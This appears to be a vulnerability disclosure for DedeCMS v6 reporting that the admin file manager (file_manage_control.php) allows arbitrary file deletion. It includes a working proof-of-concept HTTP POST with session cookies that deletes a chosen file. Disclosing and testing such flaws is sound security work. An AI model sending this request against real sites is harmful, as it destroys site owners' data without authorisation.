# dedecmsv6
There are no restrictions on deleting files in file_manage_control.php and file_class.php,
so sending fixed data packets to file_manage_control.php can delete any file on the website.

![图片](https://user-images.githubusercontent.com/40231393/195552507-f99bf93d-f17c-4f93-82f3-3b31aa0b4b4a.png)
![图片](https://user-images.githubusercontent.com/40231393/195552579-a06ecffa-3a27-40f0-a0c0-ad7fda206832.png)
![图片](https://user-images.githubusercontent.com/40231393/195552717-5c919517-9fdb-4d49-9e1b-572656016f86.png)

After the administrator logs in, the following data packets are sent, activepath represents the directory, and filename represents the file name：

![图片](https://user-images.githubusercontent.com/40231393/195552936-f738a5bc-285c-4cb0-afd7-2fc8eaf307bb.png)
![图片](https://user-images.githubusercontent.com/40231393/195553123-a6d66c3a-6eb9-4cda-b584-43fb82645e42.png)
![图片](https://user-images.githubusercontent.com/40231393/195553149-0223fa8c-629d-40bb-a90f-026dbbea5214.png)

POC:

POST /DedeCMSV6-master/src/admin/file_manage_control.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://xx.xx.xx.xx
Connection: close
Referer: http://xx.xx.xx.xx/DedeCMSV6-master/src/admin/file_manage_view.php?fmdo=del&filename=test.php&activepath=
Cookie: menuitems=1_1%2C2_1%2C3_1%2C5_1%2C4_1; PHPSESSID=i20mmut5128j63u9esd5l9k8s6; DedeUserID=1; DedeUserID__ckMd5=210ceb5e86540252; DedeLoginTime=1665381687; DedeLoginTime__ckMd5=bf8aeae2f9ed5fd0; dede_csrf_token=97cb0292999d618f7e6a62e475bec9ad; dede_csrf_token__ckMd5=d502bce6a74e73cc; ENV_GOBACK_URL=%2FDedeCMSV6-master%2Fsrc%2Fadmin%2Fmedia_main.php%3Fdopost%3Dfilemanager
Upgrade-Insecure-Requests: 1

fmdo=del&activepath=/&filename=test.php
